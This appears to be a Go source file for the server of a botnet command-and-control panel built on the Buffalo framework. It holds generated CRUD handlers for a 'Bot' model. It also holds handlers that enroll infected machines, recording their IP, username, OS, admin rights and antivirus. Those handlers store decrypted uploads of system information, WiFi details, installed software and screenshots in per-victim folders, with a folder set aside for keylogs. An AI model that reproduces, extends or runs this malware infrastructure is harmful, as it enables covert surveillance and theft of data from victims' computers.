package actions

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/MShoaei/command_control/models"
	"github.com/MShoaei/command_control/utils"

	"github.com/gobuffalo/buffalo"
	"github.com/gobuffalo/pop"
	"github.com/pkg/errors"
)

// This file is generated by Buffalo. It offers a basic structure for
// adding, editing and deleting a page. If your model is more
// complex or you need more than the basic implementation you need to
// edit this file.

// Following naming logic is implemented in Buffalo:
// Model: Singular (Bot)
// DB Table: Plural (bots)
// Resource: Plural (Bots)
// Path: Plural (/bots)
// View Template Folder: Plural (/templates/bots/)

// BotsResource is the resource for the Bot model
type BotsResource struct {
	buffalo.Resource
}

// List gets all Bots. This function is mapped to the path
// GET /bots
func (v BotsResource) List(c buffalo.Context) error {
	// Get the DB connection from the context
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	bots := &models.Bots{}

	// Paginate results. Params "page" and "per_page" control pagination.
	// Default values are "page=1" and "per_page=20".
	q := tx.PaginateFromParams(c.Params())

	// Retrieve all Bots from the DB
	if err := q.All(bots); err != nil {
		return errors.WithStack(err)
	}

	// Add the paginator to the context so it can be used in the template.
	c.Set("pagination", q.Paginator)

	return c.Render(200, r.Auto(c, bots))
}

// Show gets the data for one Bot. This function is mapped to
// the path GET /bots/{bot_id}
func (v BotsResource) Show(c buffalo.Context) error {
	// Get the DB connection from the context
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Allocate an empty Bot
	bot := &models.Bot{}

	// To find the Bot the parameter bot_id is used.
	if err := tx.Find(bot, c.Param("bot_id")); err != nil {
		return c.Error(404, err)
	}

	return c.Render(200, r.Auto(c, bot))
}

// New renders the form for creating a new Bot.
// This function is mapped to the path GET /bots/new
func (v BotsResource) New(c buffalo.Context) error {
	return c.Render(200, r.Auto(c, &models.Bot{}))
}

// Create adds a Bot to the DB. This function is mapped to the
// path POST /bots
func (v BotsResource) Create(c buffalo.Context) error {
	// Allocate an empty Bot
	bot := &models.Bot{}

	// Bind bot to the html form elements
	if err := c.Bind(bot); err != nil {
		return errors.WithStack(err)
	}

	// Get the DB connection from the context
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Validate the data from the html form
	verrs, err := tx.ValidateAndCreate(bot)
	if err != nil {
		return errors.WithStack(err)
	}

	if verrs.HasAny() {
		// Make the errors available inside the html template
		c.Set("errors", verrs)

		// Render again the new.html template that the user can
		// correct the input.
		return c.Render(422, r.Auto(c, bot))
	}

	// If there are no errors set a success message
	c.Flash().Add("success", "Bot was created successfully")

	// and redirect to the bots index page
	return c.Render(201, r.Auto(c, bot))
}

// Edit renders a edit form for a Bot. This function is
// mapped to the path GET /bots/{bot_id}/edit
func (v BotsResource) Edit(c buffalo.Context) error {
	// Get the DB connection from the context
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Allocate an empty Bot
	bot := &models.Bot{}

	if err := tx.Find(bot, c.Param("bot_id")); err != nil {
		return c.Error(404, err)
	}

	return c.Render(200, r.Auto(c, bot))
}

// Update changes a Bot in the DB. This function is mapped to
// the path PUT /bots/{bot_id}
func (v BotsResource) Update(c buffalo.Context) error {
	// Get the DB connection from the context
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Allocate an empty Bot
	bot := &models.Bot{}

	if err := tx.Find(bot, c.Param("bot_id")); err != nil {
		return c.Error(404, err)
	}

	// Bind Bot to the html form elements
	if err := c.Bind(bot); err != nil {
		return errors.WithStack(err)
	}

	verrs, err := tx.ValidateAndUpdate(bot)
	if err != nil {
		return errors.WithStack(err)
	}

	if verrs.HasAny() {
		// Make the errors available inside the html template
		c.Set("errors", verrs)

		// Render again the edit.html template that the user can
		// correct the input.
		return c.Render(422, r.Auto(c, bot))
	}

	// If there are no errors set a success message
	c.Flash().Add("success", "Bot was updated successfully")

	// and redirect to the bots index page
	return c.Render(200, r.Auto(c, bot))
}

// Destroy deletes a Bot from the DB. This function is mapped
// to the path DELETE /bots/{bot_id}
func (v BotsResource) Destroy(c buffalo.Context) error {
	// Get the DB connection from the context
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Allocate an empty Bot
	bot := &models.Bot{}

	// To find the Bot the parameter bot_id is used.
	if err := tx.Find(bot, c.Param("bot_id")); err != nil {
		return c.Error(404, err)
	}

	if err := tx.Destroy(bot); err != nil {
		return errors.WithStack(err)
	}

	// If there are no errors set a flash message
	c.Flash().Add("success", "Bot was destroyed successfully")

	// Redirect to the bots index page
	return c.Render(200, r.Auto(c, bot))
}

func ScreenShotHandler(c buffalo.Context) error {
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Allocate an empty Bot
	bot := &models.Bot{}

	// To find the Bot the parameter bot_id is used.
	if err := tx.Find(bot, c.Param("bot_id")); err != nil {
		return c.Error(404, err)
	}

	fileName := filepath.Join(Profiles, bot.ID.String(), strings.Replace(time.Now().Format(time.RFC822Z), ":", "-", -1)+".png")

	f := utils.Decrypt(c.Value("1").(string))

	err := ioutil.WriteFile(fileName, f, os.ModeAppend)
	return err
}

func RegisterHandler(c buffalo.Context) error {
	tx, ok := c.Value("tx").(*pop.Connection)
	if !ok {
		return errors.WithStack(errors.New("no transaction found"))
	}

	// Allocate an empty Bot
	bot := &models.Bot{}
	// To find the Bot the parameter bot_id is used.
	// err should NOT be nil which means we didn't find this bot_id which is good!

	// if err := tx.Find(bot, c.Param("bot_id")); err == nil {
	// 	return c.Error(404, err)
	// }

	bot.IP = c.Param("1")
	bot.WhoAmI = c.Param("2")
	bot.OS = c.Param("3")
	bot.InstallDate = c.Param("4")
	bot.Admin = c.Param("5")
	bot.AV = c.Param("6")
	bot.CPU = c.Param("7")
	bot.GPU = c.Param("8")
	bot.Version = c.Param("9")
	bot.LastCheckin = "not blank!"
	bot.LastCommand = "not blank!"

	// Validate the data from the html form
	verrs, err := tx.ValidateAndCreate(bot)
	if err != nil {
		return errors.WithStack(err)
	}

	if verrs.HasAny() {
		// Make the errors available inside the html template
		c.Set("errors", verrs)

		// Render again the edit.html template that the user can
		// correct the input.
		return c.Render(422, r.String(`error ........<%= errors %>`))
	}

	botProfilePath := filepath.Join(Profiles, bot.ID.String())
	if _, err := os.Stat(filepath.Join(Profiles, bot.ID.String())); os.IsNotExist(err) {
		fmt.Println(botProfilePath)
		os.MkdirAll(botProfilePath, os.ModeDir)
	} else {
		// should not happen!
		return errors.New("This shouldn't happen")
	}

	os.Mkdir(filepath.Join(botProfilePath, "Files"), os.ModeDir)
	os.Mkdir(filepath.Join(botProfilePath, "Screenshots"), os.ModeDir)
	os.Mkdir(filepath.Join(botProfilePath, "Keylogs"), os.ModeDir)

	ioutil.WriteFile(filepath.Join(botProfilePath, "Files", "System Information.txt"), utils.Decrypt(c.Param("10")), os.ModeExclusive)
	ioutil.WriteFile(filepath.Join(botProfilePath, "Files", "WiFi Information.txt"), utils.Decrypt(c.Param("11")), os.ModeExclusive)
	ioutil.WriteFile(filepath.Join(botProfilePath, "Files", "IP Config.txt"), utils.Decrypt(c.Param("12")), os.ModeExclusive)
	ioutil.WriteFile(filepath.Join(botProfilePath, "Files", "Installed Software.txt"), utils.Decrypt(c.Param("13")), os.ModeExclusive)
	ioutil.WriteFile(filepath.Join(botProfilePath, "Screenshots", "Default.png"), utils.Decrypt(c.Param("14")), os.ModeExclusive)

	return c.Render(200, r.String(bot.ID.String()))
}
